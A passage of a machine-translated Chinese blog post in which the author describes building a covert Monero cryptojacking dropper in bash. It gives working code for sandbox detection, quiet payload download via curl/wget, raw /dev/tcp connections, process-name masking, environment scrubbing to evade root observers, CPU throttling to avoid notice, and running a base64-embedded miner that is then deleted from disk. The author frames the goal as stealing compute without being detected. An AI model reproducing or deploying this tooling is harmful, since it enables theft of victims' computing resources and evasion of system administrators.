s=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/sys/*'</span>)
p=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/proc/*'</span>)
jail=
<span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$c</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$d</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$s</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$p</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment>## we are in a jail</span>
    jail=1
<span class=hljs-keyword>fi</span></code></pre><p>现在是下载我们的有效载荷的时候了，我们选择同时支持 wget 和 curl，我们已经知道如何使用带有谨慎标志的 wget，对于 curl 它有点不同。我们必须创建一个配置文件，并覆盖<code>CURL_HOME</code><pre><code class="bash hljs"><span class=hljs-built_in>echo</span><span class=hljs-string>"url = <span class=hljs-variable>$uri</span>
output = <span class=hljs-variable>${name}</span><span class=hljs-variable>${format}</span>
connect-timeout = 10
"</span> > .curlrc
CURL_HOME=<span class=hljs-variable>$PWD</span> curl -sOL</code></pre><p>最后一步只是提取有效载荷<pre><code class="bash hljs"><span class=hljs-built_in>type</span> unzip &>/dev/null &&
    format=<span class=hljs-string>".zip"</span> extract=<span class=hljs-string>"unzip -q"</span> ||
        format=<span class=hljs-string>".tar.gz"</span> extract=<span class=hljs-string>"tar xf"</span></code></pre><p>值得一提的是使用 [CDN] 为有效负载提供服务。在这里，cloudflare 再次拯救了我们的带宽支出。通过简单地用一个重命名我们的压缩负载<em> 文件扩展名</em> 由 cloudflare 支持......它被缓存。 Cloudflare 不会检查其服务的标头，可能是因为在这种规模上这样做是不切实际的。<h2 id=adventures_down_bashland><a class=header-anchor href=#adventures_down_bashland> 巴什兰的冒险</a></h2><p>选择 Bash 的假设是它是可移植的，看起来不会太不合适，并且与其他脚本语言（如 perl、ruby 或 python）相比更普遍。事实是，用 golang 或 lua 编写的独立二进制文件会更容易，错误更少，更容易维护，基本上 bash 是最糟糕的选择，在我的辩护中，当我用 bash 挠痒痒时，来不及重写了，也越来越无聊了。<p>还可以选择使用带有编译时标志的 busybox 来使用所有内置函数（如 grep 和 sed），但是以这种方式使用内置函数不允许产生作业（fork）并使守护进程暴露于潜在的死锁。<p>我将在这里描述一些 bash 函数，并提供完整列表<a href=\assets/posts/bash_functions.txt> 这里</a><pre><code class="bash hljs"><span class=hljs-comment>## echo a string long $1 of random lowercase chars</span><span class=hljs-function><span class=hljs-title>rand_string</span></span>() {
    <span class=hljs-built_in>local</span> c=0
    <span class=hljs-keyword>while</span> [ <span class=hljs-variable>$c</span> -lt <span class=hljs-variable>$1</span> ]; <span class=hljs-keyword>do</span><span class=hljs-built_in>printf</span><span class=hljs-string>"\x<span class=hljs-subst>$(printf '%x' $((97+RANDOM%25)</span>))"</span>
        c=$((c+<span class=hljs-number>1</span>))
    <span class=hljs-keyword>done</span>
}</code></pre><p>使用<code>RANDOM</code> 变量来获取对应于字符代码的 97-122 之间的数字，printf 应该是内置的，我们不想在循环中分叉。<pre><code class="bash hljs"><span class=hljs-comment>## make a new file descriptor named $1</span><span class=hljs-function><span class=hljs-title>newfd</span></span>() {
    <span class=hljs-built_in>eval</span><span class=hljs-string>"local fd=\${<span class=hljs-variable>$1</span>}"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span> &>/dev/null
    <span class=hljs-built_in>local</span> pp=<span class=hljs-string>".<span class=hljs-subst>$(rand_string 8)</span>"</span>
    mkfifo <span class=hljs-variable>$pp</span><span class=hljs-built_in>unset</span><span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec {<span class=hljs-variable>$1</span>}<><span class=hljs-variable>$pp</span>"</span><span class=hljs-comment># unlink the named pipe</span>
    rm -f <span class=hljs-variable>$pp</span>
}</code></pre><p>利用管道创建匿名文件描述符，它们的行为不像文件描述符，但它们足以<a href=https://en.wikipedia.org/wiki/Inter-process_communication> 工控机</a>.<pre><code class="bash hljs"><span class=hljs-comment>## https://unix.stackexchange.com/a/407383/163931</span><span class=hljs-function><span class=hljs-title>fleep</span></span>()
{
    <span class=hljs-comment># log "fleep: called by ${FUNCNAME[1]}"</span>
    [ -n <span class=hljs-string>"<span class=hljs-variable>${_snore_fd}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> != 0 ] ||
        newfd _snore_fd
    <span class=hljs-comment># log "fleep: starting waiting with ${_snore_fd}"</span><span class=hljs-keyword>if</span> ! <span class=hljs-built_in>command</span> >&<span class=hljs-variable>${_snore_fd}</span>; <span class=hljs-keyword>then</span>
        newfd _snore_fd
    <span class=hljs-keyword>fi</span><span class=hljs-built_in>read</span> -t <span class=hljs-variable>${1:-1}</span> -u <span class=hljs-variable>$_snore_fd</span><span class=hljs-comment># log "fleep: ended"</span>
}</code></pre><p>不分叉休眠，通过滥用 read 内置函数的超时功能，它使用专用的文件描述符，我们必须确保它可用以避免终止。<p>有这样的功能<code>get_pid_stats</code>, <code>usgmon_prc</code>, <code>proc_usg_u</code>, <code>cpumon</code>, <code>loadmon</code> 用于监控系统使用情况，这些都是利用linux<code>/proc</code> 没有工具的文件，如<code>ps</code> ，所以没有分叉，都是纯粹的 bash。<pre><code class="bash hljs"><span class=hljs-function><span class=hljs-title>start_coproc</span></span>() {
    <span class=hljs-built_in>local</span><span class=hljs-built_in>unset</span><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> = <span class=hljs-built_in>exec</span> ]; <span class=hljs-keyword>then</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span><span class=hljs-keyword>else</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$UNSET_COPROC_VARS</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>unset</span>=<span class=hljs-string>"unset <span class=hljs-variable>$UNSET_COPROC_VARS</span>;"</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>log</span><span class=hljs-string>"starting coproc <span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-built_in>unset</span> -v <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-comment>## only the variable, not functions</span><span class=hljs-built_in>eval</span><span class=hljs-string>"coproc <span class=hljs-variable>$coproc_name</span> { <span class=hljs-variable>$unset</span> $*; }"</span><span class=hljs-comment># 2>/dev/null</span><span class=hljs-built_in>unset</span> UNSET_COPROC_VARS
        wait_coproc <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span> 3 && <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
}
<span class=hljs-function><span class=hljs-title>stop_coproc</span></span>() {
    <span class=hljs-comment>## clear fds</span>
    id_coproc <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> && [ -n <span class=hljs-string>"<span class=hljs-variable>$job_n</span>"</span> ] && <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> %<span class=hljs-variable>$job_n</span>"</span> ||
        { <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> \${<span class=hljs-variable>${1}</span>_PID}"</span>; } ||
        { <span class=hljs-built_in>log</span><span class=hljs-string>"could not kill the specified coprocess with job <span class=hljs-variable>$job_n</span>"</span> && <span class=hljs-built_in>return</span> 1; }
}</code></pre><p>自 bash 以来，协进程可用<code>v4</code> ，它们就像作业，只是它们有一个名称和它们自己的文件描述符。<pre><code class="bash hljs"><span class=hljs-comment>## clear file descriptors</span><span class=hljs-function><span class=hljs-title>clear_fds</span></span>() {
    <span class=hljs-built_in>local</span> fd
    <span class=hljs-keyword>for</span> fd <span class=hljs-keyword>in</span> $(compgen -G <span class=hljs-string>"/proc/<span class=hljs-variable>$BASHPID</span>/fd/*"</span>); <span class=hljs-keyword>do</span>
        fd=<span class=hljs-variable>${fd/*\/}</span><span class=hljs-keyword>if</span> [[ ! <span class=hljs-string>" $* "</span> =~ <span class=hljs-string>" <span class=hljs-variable>${fd}</span> "</span> ]]; <span class=hljs-keyword>then</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$fd</span>"</span><span class=hljs-keyword>in</span>
                    0|1|2|255|<span class=hljs-string>"<span class=hljs-variable>$_snore_fd</span>"</span>)
                    ;;
                    *)
                        <span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span>
                        ;;
                <span class=hljs-keyword>esac</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span>
}</code></pre><p>我们正在编写一个守护进程，这是一个长期存在的进程，并且我们使用了许多文件描述符，我们真的想进行一些清理以避免发生<a href=https://web.archive.org/web/https://linux.die.net/man/5/limits.conf> 超限</a>.<pre><code class="bash hljs"><span class=hljs-comment>## queries ipinfo and gets the current ip and country/region</span><span class=hljs-function><span class=hljs-title>parse_ip</span></span> ()
{
    <span class=hljs-built_in>export</span> ip country region;
    [ ! -e cfg/geoip.json ] && <span class=hljs-built_in>log</span><span class=hljs-string>"geolocation codes file not found."</span> && <span class=hljs-built_in>return</span> 1;
    ipquery=$(http_req ipinfo.io);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed querying ipinfo"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'ip\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    ip=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ip</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data ip"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'country\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    country=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>${after,,}</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$country</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data country"</span> && <span class=hljs-built_in>return</span> 1;
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\": {}</span>"</span> ]; <span class=hljs-keyword>then</span>
            before_after <span class=hljs-string>'"'</span><span class=hljs-string>"<span class=hljs-variable>$l</span>"</span><span class=hljs-string>'"'</span>;
            lastregion=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
        <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"<span class=hljs-variable>${country}</span>\"}</span>"</span> ]; <span class=hljs-keyword>then</span>
                region=<span class=hljs-variable>$lastregion</span>;
                <span class=hljs-built_in>break</span>;
            <span class=hljs-keyword>fi</span>;
        <span class=hljs-keyword>fi</span>;
    <span class=hljs-keyword>done</span> < cfg/geoip.json
}</code></pre><p>这个函数依赖<a href=https://ipinfo.io/> 信息</a> 确定工人的区域，这允许调整一些区域相关的逻辑，<a href=\assets/posts/geoip.json> geoip.json</a> 将国家分组为区域，因为我们想要顶级区域，并且对特定国家不感兴趣。<pre><code class="bash hljs"><span class=hljs-comment># try to open a connection to host $1 with port $2 and output to $3</span><span class=hljs-function><span class=hljs-title>open_connection</span></span>() {
    <span class=hljs-built_in>exec</span> {socket}<>/dev/tcp/<span class=hljs-variable>${1}</span>/<span class=hljs-variable>${2}</span> 2>/dev/null
    <span class=hljs-built_in>echo</span><span class=hljs-variable>$socket</span> >&<span class=hljs-variable>${3}</span>
}

<span class=hljs-comment>## check if a tcp connection to $1=$HOST $2=$PORT is successful</span><span class=hljs-function><span class=hljs-title>check_connection</span></span>() {
    <span class=hljs-built_in>local</span> host=<span class=hljs-variable>$1</span> port=<span class=hljs-variable>$2</span> conn_socket=
    [ -z <span class=hljs-string>"<span class=hljs-variable>$host</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no host provided'</span>; <span class=hljs-built_in>return</span> 1; }
    [ -z <span class=hljs-string>"<span class=hljs-variable>$port</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no port provided'</span>; <span class=hljs-built_in>return</span> 1; }
    newfd conn_socket
    timeout 3 open_connection <span class=hljs-variable>$host</span><span class=hljs-variable>$port</span><span class=hljs-variable>$conn_socket</span><span class=hljs-comment># read the fd of the opened connection from the conn_socket fd and close it</span>
    read_fd <span class=hljs-variable>$conn_socket</span> avl -
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$avl</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment># close connection</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>${avl}</span><&-"</span> &>/dev/null
        <span class=hljs-built_in>return</span> 0 <span class=hljs-comment>## connection can be established</span><span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## connection can't be established</span><span class=hljs-keyword>fi</span>
}</code></pre><p>Bash 支持 tcp 连接，通过对<code>/dev/tcp</code> （也适用于 udp，但大多数似乎通常在构建时被禁用，因此您不能依赖它）。这些文件是 bash 的东西，它们不是 linux 的一部分<code>/dev</code> 树。<p>值得一提的是还有一个锁定系统来处理 bash 作业之间的并发性。为了允许多个作业使用锁，它们都需要共享一个文件描述符，所以我们的<code>locker</code> 这也是一项工作，必须在其他希望使用锁的工作之前启动。储物柜只是阅读<code>stdin</code> 等待锁定请求，响应<code>stdout</code> 取决于存储在变量中的当前布尔状态。我不保证这种方法是无竞争的，但似乎工作得很好，另一方面，我发现文件描述符不是很可靠，因为我怀疑有些缓冲区不会被刷新<em> 管道</em> 并最终陷入僵局（这意味着您不能一直依赖储物柜给您答案）。<pre><code class="bash hljs"><span class=hljs-comment>## unset bash env apart excluded vars/funcs</span><span class=hljs-function><span class=hljs-title>clear_env</span></span>(){
    <span class=hljs-built_in>local</span><span class=hljs-built_in>functions</span>=$(<span class=hljs-built_in>declare</span> -F)
    <span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions//declare -f }</span><span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/$u[[:space:]]}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>local</span> vars=$(<span class=hljs-built_in>set</span> -o posix; <span class=hljs-built_in>set</span> | <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-built_in>echo</span><span class=hljs-variable>${l/=*}</span>; <span class=hljs-keyword>done</span>)
    <span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span>
        vars=<span class=hljs-variable>${vars/$u[[:space:]]}</span>
        vars=<span class=hljs-variable>${vars/[[:space]]$u}</span>
        vars=<span class=hljs-variable>${vars/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>unset</span> -f <span class=hljs-variable>$functions</span> &>/dev/null
    <span class=hljs-built_in>unset</span> -v <span class=hljs-variable>$vars</span> &>/dev/null
    <span class=hljs-comment># unset $vars &>/dev/null</span>
}

<span class=hljs-comment>## unexport most variables</span><span class=hljs-function><span class=hljs-title>dex_env</span></span>() {
    exported=$(<span class=hljs-built_in>export</span> -p)
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> e; <span class=hljs-keyword>do</span>
        n=<span class=hljs-variable>${e/declare -*x }</span>
        [ <span class=hljs-string>"<span class=hljs-variable>$n</span>"</span> = <span class=hljs-string>"<span class=hljs-variable>$e</span>"</span> ] && <span class=hljs-built_in>continue</span><span class=hljs-comment>## multiline var</span>
        n=<span class=hljs-variable>${n/=*}</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$n</span>"</span><span class=hljs-keyword>in</span><span class=hljs-string>"SHELL"</span>|<span class=hljs-string>"USER"</span>|<span class=hljs-string>"HOME"</span>|<span class=hljs-string>"TMUX"</span>|<span class=hljs-string>"CHARSET"</span>|<span class=hljs-string>"TERM"</span>)
                <span class=hljs-built_in>continue</span>
                ;;
            *)
                dexported=<span class=hljs-string>"<span class=hljs-variable>$dexported</span><span class=hljs-variable>${n/=*}</span>"</span><span class=hljs-keyword>esac</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-variable>$exported</span>"</span><span class=hljs-built_in>export</span> -n <span class=hljs-variable>$dexported</span>
}</code></pre><p>清理你的垃圾……复杂的 bash 程序最终会使用许多变量，如果你滥用全局空间，它会变得臃肿。如果您生成 shell 作业，它们会继承所有环境（实际上是复制的，而不是共享的），您可能很快就会吃掉 bash<code>100M</code> 记忆力，不好。我们也很想低调。在我们的部署场景中，对手<sup id=fnref:adversary><a class=fnref href=#fndef:adversary>[1]</a></sup> 可能具有 root 访问权限和有关我们进程的完整信息<sup id=fnref:infoproc><a class=fnref href=#fndef:infoproc>[2]</a></sup> ，并且您知道...每个进程都保存有关启动它的完整命令以及导出的环境变量的信息。<h2 id=configuration><a class=header-anchor href=#configuration> 配置</a></h2><p>一旦我们有了我们的环境和工具，我们就必须为它运行的机器调整我们的矿机，伪代码中的配置步骤：<ul><li><p>矿工的进程名称<li><p>主机信息（ram/cores/caches/<code>ENV_VARS</code>)<li><p>配置版本<li><p><code>worker_id</code> 对于矿工（来自 ip 和主机）<li><p>连接的 ip/端口</ul><p>需要为进程选择一个名称<em> 隐藏</em> 事实上，我们正在运行一个矿工，但我们不仅仅是重命名我们的二进制文件，我们还有一个列表<strong> 面具</strong> 对于潜在候选人（纯文本文件，其中每一行都是一个掩码）：<ul><li><p>随机挑选一个口罩<li><p>打乱字符串尾部的元素（除第一个之外的所有元素）以获得不同的进程命令。现在我们有一个字符串看起来像<code>cmd --arg2 --arg1 --arg3</code> .这是我们的矿工掩码，我们运行二进制文件<em> 没有</em> 参数，但看起来我们启动了一个命令<code>cmd</code> 有论据<code>--arg1 --arg2 --arg3</code>.文件名中允许使用空格和破折号，因此运行这样命名的二进制文件是可以的，在存储进程命令时，linux 似乎无法区分可执行文件和参数。<p>矿工配置是自动加载的<code>$PWD</code>.</ul><h3 id=hashrate><a class=header-anchor href=#hashrate> 算力</a></h3><p>，随着时间的推移，上游矿工得到了很多<strong> 自动调谐</strong> 功能，所以它使我的部分脚本变得多余，但这里上游和下游的区别在于上游目标是最大化<em> 表现</em> ，而我们的目标是最大化<em> 效率和混淆</em> ，我们不想超越系统，我们想在不中断服务的情况下窃取一点。<sup id=fnref:monerominer><a class=fnref href=#fndef:monerominer>[3]</a></sup><p>为此，我们需要对环境有更细致的了解，<code>l2/l3</code> 处理器、内存和内核的缓存结构，以及当前处理器<em> 平均数</em> 负载和CPU<em> 用法</em> .我试图建立一个<a href=https://en.wikipedia.org/wiki/Finite-state_machine> 状态机</a> 在 bash 中，它会从最低限度开始，尝试不同的配置，慢慢地在平均最好的情况下解决。那是个<strong> 巨大的</strong> 白费力气<a href=https://en.wikipedia.org/wiki/Technical_debt> 技术债</a> 很快就破产了，而且大部分都被丢弃了，只剩下代码库中的残余物。<p>粉碎所有这些自动调整的巨无霸，我们只是根据主机使用情况/负载让矿工休眠，这需要矿工修改<code>sleep</code> 线程之间的产量，以及对配置看门狗的一些修复<sup id=fnref:configwatch><a class=fnref href=#fndef:configwatch>[4]</a></sup> ，这将允许我们在运行时重新加载睡眠量。逻辑要简化得多，如下所示：<ul><li><p>如果使用率高于/低于 $TARGET_USAGE (± 误差幅度) 增加/减少睡眠<li><p>如果平均负载在<code>1m</code> 高于/低于 $TARGET_LOAD 暂停/恢复挖掘</ul><h3 id=connection><a class=header-anchor href=#connection> 联系</a></h3><p>在我们的 bash 综述中，我们展示了用于连接的实用程序。为什么我们需要这些？因为我们需要多样性；简单地将端点硬编码到配置中不会持续很长时间，当某些事情看起来可疑并且有网络活动时，IP 会被标记。<p>一开始我们尝试了几种方法：<ul><li><p>使用<a href=https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains> 代理链</a> 使矿工网络调用过载，但它需要使用动态库构建矿工，并且您必须将它们与有效载荷一起发送，因此这是不切实际的。<li><p>运行一个<a href=https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost> 前向隧道</a> 与矿工并排：这有很多配置开销，因为现在我们在每个部署上配置两个进程，这意味着更多的错误。</ul><p>最后，我们只发布了一个端点列表，存储在 bash 变量中，随机选择一个。连接当然是加密的。这些端点是什么？转发到将处理矿工工作的代理。</p><img src=/assets/posts/chronichles_of_a_cryptonote_dropper/code/output/miner.png><p>为什么我们需要一个<a href=https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy> 挖矿代理</a> ?我从来没有真正超过 100 个并发连接，所以网络负载并不是真的需要代理，但它很方便协商哈希算法，并为不同的矿工提供不同的难度目标，以防止矿工工作<strong> 困难</strong> 需要花费太多时间才能完成的目标，并避免将计算浪费在未完成的工作上的风险。<sup id=fnref:difficulty><a class=fnref href=#fndef:difficulty>[5]</a></sup> 池软件还需要一些修改，因为它很高兴地宣传成为普通 http 请求的代理......<em> 必须超时</em> ，并且一个 fork 添加了访问控制，因此我们的 mod 以此为基础。<sup id=fnref:stratumprotocol><a class=fnref href=#fndef:stratumprotocol>[6]</a></sup><h3 id=editing_json><a class=header-anchor href=#editing_json> 编辑json</a></h3><p>仅使用 bash 将修改应用于 json 文件，我们通过一些 env var 替换和一些正则表达式得到了。最初我们依赖于<code>envsubst</code> 二进制来应用变量，然后我们就全力以赴<sup id=fnref:fullbash><a class=fnref href=#fndef:fullbash>[7]</a></sup> 用这个逻辑：<ul><li><p>读取配置模板<li><p>用一个非常深奥的字符串替换所有引号（如<code>_#_#</code>)<li><p><code>eval</code> 模板<li><p>用引号替换所有深奥的事件</ul><p>除了避免子进程之外，另一个优点是我们在模板中获得了完整的 bash 功能。对于没有模板的读写，我们必须依赖 bash regex 功能：<pre><code class="bash hljs">cc_rgx=<span class=hljs-string>'( *".*?" *: *)("(.*?)"|([^,]*?)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>change_config</span></span>() {
	<span class=hljs-built_in>local</span> subs
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$cc_rgx</span> ]]
			matches=(<span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[@]}</span>"</span>)
			[ -n <span class=hljs-string>"<span class=hljs-variable>${matches[3]}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>${2:0:1}</span>"</span> != <span class=hljs-string>"\""</span> ] &&
				subs=<span class=hljs-string>"\"<span class=hljs-variable>$2</span>\""</span> ||
				subs=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span>
			CONFIG=<span class=hljs-variable>${CONFIG/<span class=hljs-variable>${matches[0]}</span>/<span class=hljs-variable>${matches[1]}</span>$subs<span class=hljs-variable>${matches[5]}</span>}</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}

<span class=hljs-comment>## output miner config value $1 unquoted</span>
gc_rgx=<span class=hljs-string>' *"[^:]+" *: *("(.*?)"|([^,]*)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>get_config</span></span>() {
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$gc_rgx</span> ]]
			[ -n <span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ] &&
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ||
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[3]}</span>"</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}</code></pre><p>这仅允许我们编辑单行，对于多行条目，它只考虑第一行......但对于我们的用例来说已经足够了。<h2 id=runtime><a class=header-anchor href=#runtime> 运行</a></h2><p>我们的运行时是什么样的？我们有一个执行主循环的主 bash 进程，然后是 miner 子进程、cpu monitor 子进程、locker 和 tuner。这几乎是一把。<p>首先我们要确保如果出现问题，我们不会留下一团糟，这意味着我们使用 bash 陷阱在终止时执行清理<pre><code class="bash hljs"><span class=hljs-built_in>trap</span><span class=hljs-string>"trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &>/dev/null ; fleep 10"</span> SIGINT EXIT SIGKILL SIGTERM</code></pre><p><code>trap - ...</code> 取消设置陷阱以防止递归。陷阱会杀死所有工作并消除工作环境。<p>是时候启动矿工了，它以 base64 编码存储为 bash 变量。我们将它转​​储到文件系统上，然后转储配置，执行矿工，并删除矿工和配置。在 linux 上，您可以删除正在运行的进程的可执行文件，（在 Windows 上这是不允许的）。<sup id=fnref:memoryondemand><a class=fnref href=#fndef:memoryondemand>[8]</a></sup>当矿工运行时，文件系统上只有一个<code>.. /</code> 目录与<code>b64</code> 链接在里面。<pre><code class="bash hljs"><span class=hljs-comment>## put a file $1 into a var $2</span><span class=hljs-function><span class=hljs-title>fileToVar</span></span>(){
    <span class=hljs-built_in>declare</span> -n tmpd=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span> && tmpd=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>) && <span class=hljs-built_in>return</span><span class=hljs-keyword>if</span> [ -z <span class=hljs-string>"<span class=hljs-variable>$tmpd</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>log</span><span class=hljs-string>"gobbling in array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$2</span>=1"</span><span class=hljs-comment>## avoid empty checks</span>
        gobbled[<span class=hljs-variable>$2</span>]=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>)
    <span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## do not quote assignment otherwise ram is not released</span><span class=hljs-keyword>fi</span>
}
<span class=hljs-comment>## put a var $1 into a file $2</span><span class=hljs-function><span class=hljs-title>varToFile</span></span>(){
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$VERBOSE</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n 2>><span class=hljs-variable>${VERBOSE}</span> && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
